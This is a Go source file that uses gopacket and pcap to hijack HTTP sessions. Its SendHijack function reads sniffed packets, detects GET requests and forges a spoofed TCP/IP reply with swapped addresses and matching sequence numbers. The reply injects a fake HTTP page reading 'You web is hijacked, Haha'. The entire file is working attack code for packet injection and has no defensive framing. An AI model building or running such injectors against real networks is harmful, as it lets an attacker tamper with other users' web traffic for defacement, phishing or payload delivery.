package main

import (
	"fmt"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	format = "HTTP/1.1 200 OK\r\n" +
		"Server: nginx/1.10.3\r\n" +
		"Date: Tue, 26 Jan 2016 13:09:19 GMT\r\n" +
		"Content-Type: text/html;charset=UTF-8\r\n" +
		"Connection: keep-alive\r\n" +
		"Vary: Accept-Encoding\r\n" +
		"Cache-Control: no-store\r\n" +
		"Pragrma: no-cache\r\n" +
		"Expires: Thu, 01 Jan 1970 00:00:00 GMT\r\n" +
		"Cache-Control: no-cache\r\n" +
		"Content-Length: %v\r\n" +
		"\r\n" +
		"%v"

	content = `<html><h1>You web is hijacked, Haha</h1></html>`
	body    []byte
)

func init() {
	body = []byte(fmt.Sprintf(format, len(content), content))
}

// SendHijack 采用gopacket发送伪造包
func SendHijack(handle *pcap.Handle, packet gopacket.Packet) {
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	pTcp := tcpLayer.(*layers.TCP)

	if pTcp.SYN || pTcp.RST {
		return
	}

	data := string(pTcp.LayerPayload())

	// Get
	if !strings.HasPrefix(data, "GET") {
		return
	}

	ethLayer := packet.Layer(layers.LayerTypeEthernet)
	eth := layers.Ethernet{
		SrcMAC:       ethLayer.(*layers.Ethernet).DstMAC,
		DstMAC:       ethLayer.(*layers.Ethernet).SrcMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipv4Layer := packet.Layer(layers.LayerTypeIPv4)
	pIp := ipv4Layer.(*layers.IPv4)

	ipv4 := layers.IPv4{
		Version:  pIp.Version,
		SrcIP:    pIp.DstIP,
		DstIP:    pIp.SrcIP,
		TTL:      77,
		Id:       pIp.Id,
		Protocol: layers.IPProtocolTCP,
	}

	tcp := layers.TCP{
		SrcPort: pTcp.DstPort,
		DstPort: pTcp.SrcPort,
		PSH:     true,
		ACK:     true,
		FIN:     true,
		Seq:     pTcp.Ack,
		Ack:     pTcp.Seq + uint32(len(data)),
		Window:  0,
	}

	tcp.SetNetworkLayerForChecksum(&ipv4)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	fmt.Printf("body=%v\n", string(body))
	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp, gopacket.Payload(body)); err != nil {
		fmt.Println(err)
	}

	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		fmt.Println(err)
	}
}
